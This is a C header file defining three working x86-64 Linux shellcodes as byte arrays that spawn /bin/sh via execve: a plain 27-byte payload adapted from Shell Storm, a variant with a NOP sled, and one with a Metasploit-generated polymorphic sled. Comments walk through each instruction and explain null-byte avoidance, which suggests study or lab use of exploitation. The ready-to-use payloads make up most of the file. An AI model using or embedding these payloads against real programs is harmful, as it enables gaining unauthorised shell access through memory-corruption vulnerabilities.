/*
 shellcodes.h contains the definition of shellcodes for the given architecture. 
 A shellcode is a small piece of code used as the payload in the exploitation 
 of a software vulnerability and typically starts a command shell.

 When creating shellcode, it is generally desirable to make it both small and
 executable. When exploiting stack vulnerabilities it is also necessary to avoid
 placing zeros as they are string terminators.
*/

/*
 The following shellcodes were obtained modifying the Shellcode written by Dad
 and published on Shell Storm:
 - http://shell-storm.org/shellcode/files/shellcode-806.php

    Linux/x86-64 - execve(/bin/sh, [/bin/sh], NULL) - 27 bytes 

 It allows to call the `execve` syscall 
 
    int execve(const char *pathname, char *const argv[], char *const envp[]);
 
 with `/bin/sh` as path, the current sp as argv and NULL as envp.

 In x86-64, the syscall instruction expects arguments in registers, 
 specifically:
  - %rax : syscall number
  - %rdi : 1st argument: pathname
  - %rsi : 2nd argument: argv pointer
  - %rdx : 3rd argument: envp pointer

 The Shellcode contains the following instructions:
 
    31 c0                           xor     %eax, %eax                      // clears eax
    48 bb d1 9d 96 91 d0 8c 97 ff   mov     $0xFF978CD091969DD1, %rbx       // move the number in rbx
    48 f7 db                        neg     %rbx                            // rbx contains 0x68732f6e69622f (*)
    53                              push    %rbx                            // push `/bin/sh` in stack
    54                              push    %rsp                            // push sp, points to `/bin/sh`
    5f                              pop     %rdi                            // load address of `/bin/sh` in %rdi
    99                              cdq                                     // clears rdx
    52                              push    %rdx                            // push null
    57                              push    %rdi                            // push pointer to `/bin/sh`
    54                              push    %rsp                            // push current stack pointer
    5e                              pop     %rsi                            // load current sp in %rsi
    b0 3b                           mov     $0x3b, %al                      
    0f 05                           syscall                                 // calls syscall 59 execve

 (*) Note that 0x68732f6e69622f is the little-endian ascii representation of 
 `/bin/sh`. Indeed in 2F 62 69 6E 2F 73 68, 2F is '/', 62 is 'b' and so on. 

 The other two shellcodes are modification of the previous one. The 'simple-nop'
 is padded at the begin with a number of NOP instructions (0x90).
 In the 'polimorphic' the NOP sled is not the standard set of 0x90 bytes but a 
 set of instructions that can be executed without affecting the correctness of 
 the actual attack code (i.e. push %rax, pop %rax are functionally equivalent
 to a NOP instruction).
*/

static char shellcode_nonop[] =
    "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53"
    "\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

// Do not count for the null terminator since a null in the shellcode will terminate any string function in the standard library
static size_t size_shellcode_nonop = sizeof(shellcode_nonop) / sizeof(shellcode_nonop[0]) - 1;

/**
 * Shell code with simple NOP sled
 * found on http://shell-storm.org/shellcode/files/shellcode-806.php
 */
static char shellcode_simplenop[] =
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53"
    "\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
// Do not count for the null terminator since a null in the shellcode will terminate any string function in the standard library
static size_t size_shellcode_simplenop = sizeof(shellcode_simplenop) / sizeof(shellcode_simplenop[0]) - 1;

// sled generated with metasploit: 'generate 40 -s rsp -t c'
static char shellcode_simplenop_equivalent[] =
    "\x58\x53\x96\xfd\x96\x58\x53\x95\x9f\x99\x52\x9c\x91\xf8\x58"
    "\x95\x58\x53\x58\x9b\x54\x5a\x95\x99\x93\x5d\x90\x53\x9c\x52"
    "\xfd\x93\x9b\x5a\x91\x57\x5e\x96\x50\x91"
    "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53"
    "\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
// Do not count for the null terminator since a null in the shellcode will terminate any string function in the standard library
static size_t size_shellcode_polynop = sizeof(shellcode_simplenop_equivalent) / sizeof(shellcode_simplenop_equivalent[0]) - 1;
